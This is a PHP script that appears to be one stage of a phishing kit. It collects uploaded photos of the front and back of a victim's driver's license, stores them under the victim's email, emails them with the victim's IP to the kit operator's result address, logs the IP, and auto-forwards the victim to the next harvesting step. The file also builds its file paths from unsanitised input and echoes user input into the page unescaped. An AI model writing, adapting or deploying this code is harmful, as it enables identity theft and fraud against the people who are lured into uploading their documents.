<?php
session_start();
require_once("../main.php");
require_once("../admin/tod/config.php");
$_SESSION['email'] = $_POST['email'];
$_SESSION['from'] = $_POST['fname'];
$username = $_SESSION['email'];
$ip = getUserIP();
if(isset($_FILES["file"]["type"]))
{
$validextensions = array("jpeg", "jpg", "png");
$temporary = explode(".", $_FILES["file"]["name"]);
$file_extension = end($temporary);
    if ((($_FILES["file"]["type"] == "image/png") || ($_FILES["file"]["type"] == "image/jpg") || ($_FILES["file"]["type"] == "image/jpeg"))){
        $sourcePath = $_FILES['file']['tmp_name'];
        $targetPath = "../pap/frontdl_".$username."_". $_FILES["file"]["name"];
        move_uploaded_file($sourcePath,$targetPath) ;
        $from = $_SESSION['from'];
        $subject = "💟 FRONT Driver's License: ".$_SESSION['email']." [ $cn - $os - $ip ]";
        kirim_foto($config['email_result'], $from, $subject, $targetPath);
        tulis_file("../admin/result/total_upload.txt", $ip);
        }
}
else
{
}
if(isset($_FILES["file2"]["type"]))
{
$validextensions = array("jpeg", "jpg", "png");
$temporary = explode(".", $_FILES["file2"]["name"]);
$file_extension = end($temporary);
    if ((($_FILES["file2"]["type"] == "image/png") || ($_FILES["file2"]["type"] == "image/jpg") || ($_FILES["file2"]["type"] == "image/jpeg"))){
        $sourcePath = $_FILES['file2']['tmp_name'];
        $targetPath = "../pap/backdl_".$username."_". $_FILES["file2"]["name"];
        move_uploaded_file($sourcePath,$targetPath) ;
        $from = $_SESSION['from'];
        $subject = "💟 BACK Driver's License: ".$_SESSION['email']." [ $cn - $os - $ip ]";
        kirim_foto($config['email_result'], $from, $subject, $targetPath);
        }
}
else
{
}
if ($config['get_email'] == "on") {
echo "<form id='boyxd' method='POST' action='email-activity'><input type='hidden' name='email' value='".$_POST['email']."'></form><script type='text/javascript'>document.getElementById('boyxd').submit();</script>";
}else{
echo "<form id='boyxd' method='POST' action='done'><input type='hidden' name='email' value='".$_POST['email']."'></form><script type='text/javascript'>document.getElementById('boyxd').submit();</script>";
}
?>
